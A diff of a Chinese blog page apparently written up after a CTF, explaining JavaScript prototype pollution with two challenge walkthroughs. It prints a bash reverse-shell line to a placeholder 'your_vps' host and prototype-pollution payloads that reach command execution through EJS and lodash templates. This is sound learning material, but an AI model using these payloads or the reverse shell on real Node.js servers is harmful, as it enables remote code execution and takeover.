@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head><meta name="generator" content="Hexo 3.9.0">
+  <head>
     
-<meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
-  <meta name="description" content="JavaScript原型链污染">
+  <meta name="description" content="JavaScript原型链污染"/>
 
 
 
 
-  <meta name="keywords" content="js,">
+  <meta name="keywords" content="js," />
 
 
 
@@ -28,19 +28,21 @@
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
 
 
 
-<link rel="canonical" href="https://glotozz.github.io/2020/02/25/JavaScript原型链污染/">
+<link rel="canonical" href="https://glotozz.github.io/2020/02/25/JavaScript原型链污染/"/>
 
 
-<meta name="keywords" content="js">
+<meta name="description" content="这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JavaScript原型链污染">
-<meta property="og:url" content="https://glotozz.github.io/2020/02/25/JavaScript原型链污染/index.html">
+<meta property="og:url" content="https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
 <meta property="og:site_name" content="glotozz&#39;blog">
-<meta property="og:locale" content="en">
+<meta property="og:description" content="这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/02/27/XS8HerNKzFCn93m.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/02/25/abcQNre6WYMsfiu.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/25/KTR4tVv1EgcNYe7.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/25/pQlbixu43N1MZWw.png">
@@ -50,14 +52,16 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/25/WhEgVnYXc3oFyPB.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/25/joeZRfgEJxHWAGv.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/25/E6LDnAuNoMzOWX5.png">
-<meta property="og:updated_time" content="2020-02-27T07:10:00.247Z">
+<meta property="article:published_time" content="2020-02-25T02:51:11.000Z">
+<meta property="article:modified_time" content="2020-02-27T10:52:27.692Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="js">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JavaScript原型链污染">
-<meta name="twitter:image" content="https://i.loli.net/2020/02/25/abcQNre6WYMsfiu.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/27/XS8HerNKzFCn93m.jpg">
 
 
-<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
-<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
 
 
 
@@ -79,7 +83,7 @@
 
 
     <title> JavaScript原型链污染 - glotozz'blog </title>
-  </head>
+  <meta name="generator" content="Hexo 4.2.0"></head>
 
   <body>
     <div id="page">
@@ -146,13 +150,27 @@
 
     
             <div class="post-content">
-            <meta name="referrer" content="no-referrer">
+            <p>这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。</p>
+<meta name="referrer" content="no-referrer">
 <a id="more"></a>
 
-<p>这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。</p>
 <hr>
-<p><strong>原型</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function A(name)&#123;</span><br><span class="line">    this.name = &apos;a&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#原理">原理</a></li>
+<li><a href="#公益赛ez-epress">公益赛Ez epress</a></li>
+<li><a href="#codebreaking-thejs">Codebreaking-thejs</a></li>
+<li><a href="#总结">总结</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p><img src="https://i.loli.net/2020/02/27/XS8HerNKzFCn93m.jpg" alt="a _4_.png"></p>
+<h4><span id="原理">原理</span></h4><p><strong>原型</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function A(name)&#123;</span><br><span class="line">    this.name &#x3D; &#39;a&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>在javascript中,每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，直到null为止 </p>
@@ -167,7 +185,7 @@
 <p><img src="https://i.loli.net/2020/02/25/pQlbixu43N1MZWw.png" alt="Snipaste_2020-02-24_20-48-00.png"></p>
 <p>上面就是两条完整的<strong>原型链</strong>，都会指向object，再指向null</p>
 <p>再举个<strong>原型链搜索</strong>的例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function y()&#123;</span><br><span class="line">	this.a = &apos;a&apos;;</span><br><span class="line">	this.b = &apos;b&apos;;</span><br><span class="line">&#125;</span><br><span class="line">j = new y;</span><br><span class="line">y.prototype.c = &apos;c&apos;;</span><br><span class="line">console.log(j.c)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function y()&#123;</span><br><span class="line">	this.a &#x3D; &#39;a&#39;;</span><br><span class="line">	this.b &#x3D; &#39;b&#39;;</span><br><span class="line">&#125;</span><br><span class="line">j &#x3D; new y;</span><br><span class="line">y.prototype.c &#x3D; &#39;c&#39;;</span><br><span class="line">console.log(j.c)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/02/25/V5eAT8rBNWCJ3ER.png" alt="Snipaste_2020-02-24_21-20-09.png"></p>
 <p>这个例子中先new了一个对象<code>j</code>，之后再<code>y</code>中添加<code>c</code>，但是仍然打印出了<code>c</code></p>
@@ -175,12 +193,12 @@
 <p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined </p>
 </blockquote>
 <p>再举个<strong>原型链污染</strong>的例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&apos;b&apos;:1&#125;</span><br><span class="line">console.log(a.b)</span><br><span class="line">a.__proto__.b = 2</span><br><span class="line">console.log(a.b)</span><br><span class="line">c = &#123;&#125;</span><br><span class="line">console.log(c.b)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; &#123;&#39;b&#39;:1&#125;</span><br><span class="line">console.log(a.b)</span><br><span class="line">a.__proto__.b &#x3D; 2</span><br><span class="line">console.log(a.b)</span><br><span class="line">c &#x3D; &#123;&#125;</span><br><span class="line">console.log(c.b)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/02/25/1RVC5H6eaGqSIFs.png" alt="Snipaste_2020-02-24_21-42-10.png"></p>
 <p>修改a的原型即Object的属性b=2，第一次打印a.b根据搜索顺序为b=1，之后new了一个字典对象即Object，因此属性b=2</p>
 <p>再举个<strong>原型链污染触发</strong>的例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let o1 = &#123;&#125;;</span><br><span class="line">let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;</span><br><span class="line">merge(o1,o2);</span><br><span class="line">console.log(o1.a,o1.b);</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;;</span><br><span class="line">console.log(o3.b);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] &#x3D; source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let o1 &#x3D; &#123;&#125;;</span><br><span class="line">let o2 &#x3D; &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;</span><br><span class="line">merge(o1,o2);</span><br><span class="line">console.log(o1.a,o1.b);</span><br><span class="line"></span><br><span class="line">o3 &#x3D; &#123;&#125;;</span><br><span class="line">console.log(o3.b);</span><br></pre></td></tr></table></figure>
 
 <p>当key为<code>__proto__</code>即可原型链污染</p>
 <p>理论上执行：<code>o1.a = 1    o1.__proto__.b = 2</code></p>
@@ -195,30 +213,29 @@
 <blockquote>
 <p>调用<code>child_process</code>模块来执行系统命令 </p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global.process.mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1&quot;&apos;)</span><br><span class="line">global.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1&quot;&apos;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;)</span><br><span class="line">global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;)</span><br></pre></td></tr></table></figure>
 
 <p>利用方式一般是object的某个属性为上面的模块并被调用</p>
 <hr>
 <p>上面都是原理，下面分析几道题</p>
-<p><strong>公益赛Ez epress</strong></p>
-<p>register需要满足小写不等于admin，之后<code>toUpperCase()</code>存入session，再与ADMIN比较</p>
+<h4><span id="公益赛ez-epress">公益赛Ez epress</span></h4><p>register需要满足小写不等于admin，之后<code>toUpperCase()</code>存入session，再与ADMIN比较</p>
 <blockquote>
 <p><code>javascript大小写特性绕过</code>： <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a> </p>
 </blockquote>
 <p>成功登录后，继续分析代码，发现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">req.session.user.data = clone(req.body);</span><br><span class="line"></span><br><span class="line">router.get(&apos;/info&apos;, function (req, res) &#123;</span><br><span class="line">  res.render(&apos;index&apos;,data=&#123;&apos;user&apos;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">const merge &#x3D; (a, b) &#x3D;&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] &#x3D; b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone &#x3D; (a) &#x3D;&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">req.session.user.data &#x3D; clone(req.body);</span><br><span class="line"></span><br><span class="line">router.get(&#39;&#x2F;info&#39;, function (req, res) &#123;</span><br><span class="line">  res.render(&#39;index&#39;,data&#x3D;&#123;&#39;user&#39;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
 <p><code>/action</code>污染原型链</p>
 <p><code>/info</code>触发污染的原型链</p>
 <p>设置object的<code>outputFunctionName</code>的属性：<code>{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}}</code></p>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c \&quot;cat /flag &gt; /app/public/flag\&quot;&apos;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag\&quot;&#39;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>失败了，就想调试下js，本地搭建</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#安装模块</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
 
 <p>发现没有提供端口启动，原文件是利用<code>bin/www</code>里面启动的，为了方便直接添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//监听端口为3000</span><br><span class="line">var server = app.listen(3000, function () &#123;</span><br><span class="line">    var host = server.address().address;</span><br><span class="line">    var port = server.address().port;</span><br><span class="line"></span><br><span class="line">    console.log(&apos;Example app listening at http://%s:%s&apos;, host, port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;监听端口为3000</span><br><span class="line">var server &#x3D; app.listen(3000, function () &#123;</span><br><span class="line">    var host &#x3D; server.address().address;</span><br><span class="line">    var port &#x3D; server.address().port;</span><br><span class="line"></span><br><span class="line">    console.log(&#39;Example app listening at http:&#x2F;&#x2F;%s:%s&#39;, host, port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 <p><code>node --inspect --debug-brk app.js</code>启动即可利用chrome自带的调试</p>
 <blockquote>
@@ -233,9 +250,8 @@
 <p>之前的payload失败是因为没有用json格式发送==！</p>
 <p>访问<code>/info</code>触发原型链，访问<code>/flag</code>下载即可</p>
 <hr>
-<p><strong>Codebreaking-thejs</strong></p>
-<p><code>server.js</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&apos;fs&apos;)</span><br><span class="line">const express = require(&apos;express&apos;)</span><br><span class="line">const bodyParser = require(&apos;body-parser&apos;)</span><br><span class="line">const lodash = require(&apos;lodash&apos;)</span><br><span class="line">const session = require(&apos;express-session&apos;)</span><br><span class="line">const randomize = require(&apos;randomatic&apos;)</span><br><span class="line"></span><br><span class="line">const app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(&apos;/static&apos;, express.static(&apos;static&apos;))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: &apos;thejs.session&apos;,</span><br><span class="line">    secret: randomize(&apos;aA0&apos;, 16),</span><br><span class="line">    resave: false,</span><br><span class="line">    saveUninitialized: false</span><br><span class="line">&#125;))</span><br><span class="line">app.engine(&apos;ejs&apos;, function (filePath, options, callback) &#123; // define the template engine</span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        if (err) return callback(new Error(err))</span><br><span class="line">        let compiled = lodash.template(content)</span><br><span class="line">        let rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        return callback(null, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(&apos;views&apos;, &apos;./views&apos;)</span><br><span class="line">app.set(&apos;view engine&apos;, &apos;ejs&apos;)</span><br><span class="line"></span><br><span class="line">app.all(&apos;/&apos;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    if (req.method == &apos;POST&apos;) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res.render(&apos;index&apos;, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</span><br></pre></td></tr></table></figure>
+<h4><span id="codebreaking-thejs">Codebreaking-thejs</span></h4><p><code>server.js</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">const fs &#x3D; require(&#39;fs&#39;)</span><br><span class="line">const express &#x3D; require(&#39;express&#39;)</span><br><span class="line">const bodyParser &#x3D; require(&#39;body-parser&#39;)</span><br><span class="line">const lodash &#x3D; require(&#39;lodash&#39;)</span><br><span class="line">const session &#x3D; require(&#39;express-session&#39;)</span><br><span class="line">const randomize &#x3D; require(&#39;randomatic&#39;)</span><br><span class="line"></span><br><span class="line">const app &#x3D; express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: &#39;thejs.session&#39;,</span><br><span class="line">    secret: randomize(&#39;aA0&#39;, 16),</span><br><span class="line">    resave: false,</span><br><span class="line">    saveUninitialized: false</span><br><span class="line">&#125;))</span><br><span class="line">app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine</span><br><span class="line">    fs.readFile(filePath, (err, content) &#x3D;&gt; &#123;</span><br><span class="line">        if (err) return callback(new Error(err))</span><br><span class="line">        let compiled &#x3D; lodash.template(content)</span><br><span class="line">        let rendered &#x3D; compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        return callback(null, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)</span><br><span class="line">app.set(&#39;view engine&#39;, &#39;ejs&#39;)</span><br><span class="line"></span><br><span class="line">app.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">    let data &#x3D; req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123;</span><br><span class="line">        data &#x3D; lodash.merge(data, req.body)</span><br><span class="line">        req.session.data &#x3D; data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res.render(&#39;index&#39;, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;))</span><br></pre></td></tr></table></figure>
 
 <p> 使用 <code>lodash</code> 实现了一个简单的 ejs 模版引擎，在请求的时候渲染。 </p>
 <p>lodash这个模块提供了两个工具<code>lodash.template</code>和<code>lodash.merge</code>，分别可用来进行原型链污染和原型链触发</p>
@@ -244,19 +260,19 @@
 <blockquote>
 <p><a href="https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089" target="_blank" rel="noopener">https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089</a> </p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = attempt(function() &#123;</span><br><span class="line">	return Function(importsKeys, sourceURL + &apos;return &apos; + source)</span><br><span class="line">	  .apply(undefined, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result &#x3D; attempt(function() &#123;</span><br><span class="line">	return Function(importsKeys, sourceURL + &#39;return &#39; + source)</span><br><span class="line">	  .apply(undefined, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 <p>追踪<code>sourceURL</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var sourceURL = &apos;sourceURL&apos; in options ? &apos;//# sourceURL=&apos; + options.sourceURL + &apos;\n&apos; : &apos;&apos;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;</span><br></pre></td></tr></table></figure>
 
 <p>其中 <code>option</code> 为我们在模版引擎中，渲染的值。这里读取其中的 <code>sourceURL</code> 属性的值，我们就可以通过这里触发原型污染</p>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\r\nreturn e =&gt;&#123;return global.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;id&apos;);&#125;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\r\nreturn e &#x3D;&gt;&#123;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;);&#125;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/02/25/E6LDnAuNoMzOWX5.png" alt="Snipaste_2020-02-25_10-13-18.png"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>简单学习了JavaScript原型链污染的原理以及两道简单的题，下一步学习可以是一些源码更加复杂，或者与其他漏洞结合利用。</p>
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p> <a href="https://www.anquanke.com/post/id/176884" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884</a> </p>
